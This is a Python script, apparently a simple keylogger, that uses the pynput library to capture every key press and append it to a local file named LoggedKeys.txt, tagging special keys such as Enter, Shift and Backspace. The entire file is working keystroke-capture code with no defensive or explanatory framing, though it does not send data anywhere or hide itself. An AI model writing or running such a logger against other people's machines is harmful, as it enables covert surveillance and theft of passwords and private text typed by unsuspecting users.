from pynput import keyboard

def logKey(key):
    """
    Function to handle keyLoggings
    :param key: keyboard key's pressed
    :return:
    """
    with open("LoggedKeys.txt", "a") as log_key:
        try:
            if key == keyboard.Key.space:
                log_key.write(' ')
            elif key == keyboard.Key.esc:
                log_key.write('Esc')
            elif key == keyboard.Key.tab:
                log_key.write('\t')
            elif key == keyboard.Key.enter:
                log_key.write(' {Enter} ')
            elif key == keyboard.Key.ctrl:
                log_key.write(' {Ctrl} ') 
            elif key == keyboard.Key.caps_lock:
                log_key.write(' {caps_lock} ') 
            elif key == keyboard.Key.ctrl_r:
                log_key.write(' {Ctrl_R} ')
            elif key == keyboard.Key.shift:
                log_key.write(' {Shift} ')
            elif key == keyboard.Key.shift_r:
                log_key.write(' {Shift_R} ')
            elif key == keyboard.Key.alt:
                log_key.write(' {Alt} ') 
            elif key == keyboard.Key.alt_r:
                log_key.write(' {Alt_r} ') 
            elif key == keyboard.Key.cmd:
                log_key.write(' {Cmd} ') 
            elif key == keyboard.Key.backspace:
                log_key.write(' {backspace} ')
            elif key == keyboard.Key.up:
                log_key.write(' {UP} ')
            elif key == keyboard.Key.down:
                log_key.write(' {Down} ')
            elif key == keyboard.Key.left:
                log_key.write(' {Left} ')
            elif key == keyboard.Key.right:
                log_key.write(' {Right} ')
            else:
                chars = key.char
                log_key.write(chars)
        except:
            print(f"Error in keyLogger {key} pressed")
            #log_key(f'\n {str(key)}')


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=logKey)
    listener.start()
    input()
